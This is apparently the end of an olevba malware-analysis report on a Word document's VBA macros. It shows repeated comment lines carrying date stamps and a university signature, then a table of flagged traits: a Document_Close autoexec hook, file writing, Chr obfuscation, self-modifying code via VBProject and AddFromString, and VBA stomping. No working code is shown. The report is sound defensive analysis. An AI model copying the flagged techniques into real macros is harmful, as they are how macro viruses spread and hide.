' Line #937:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #938:
' 	QuoteRem 0x0000 0x0000 ""
' Line #939:
' Line #940:
' Line #941:
' Line #942:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #943:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #944:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #945:
' 	QuoteRem 0x0000 0x0021 " 12:41:16 - otrdiena, 18 Dec 2001"
' Line #946:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #947:
' 	QuoteRem 0x0000 0x0000 ""
' Line #948:
' Line #949:
' Line #950:
' Line #951:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #952:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #953:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #954:
' 	QuoteRem 0x0000 0x0021 " 12:47:38 - otrdiena, 18 Dec 2001"
' Line #955:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #956:
' 	QuoteRem 0x0000 0x0000 ""
' Line #957:
' Line #958:
' Line #959:
' Line #960:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #961:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #962:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #963:
' 	QuoteRem 0x0000 0x0021 " 13:00:39 - otrdiena, 18 Dec 2001"
' Line #964:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #965:
' 	QuoteRem 0x0000 0x0000 ""
' Line #966:
' Line #967:
' Line #968:
' Line #969:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #970:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #971:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #972:
' 	QuoteRem 0x0000 0x0020 " 23:57:18 - пятница, 11 апр 2003"
' Line #973:
' 	QuoteRem 0x0000 0x0004 " rer"
' Line #974:
' 	QuoteRem 0x0000 0x0000 ""
' Line #975:
' Line #976:
' Line #977:
' Line #978:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #979:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #980:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #981:
' 	QuoteRem 0x0000 0x0020 " 09:07:31 - суббота, 12 апр 2003"
' Line #982:
' 	QuoteRem 0x0000 0x0004 " rer"
' Line #983:
' 	QuoteRem 0x0000 0x0000 ""
' Line #984:
' Line #985:
' Line #986:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

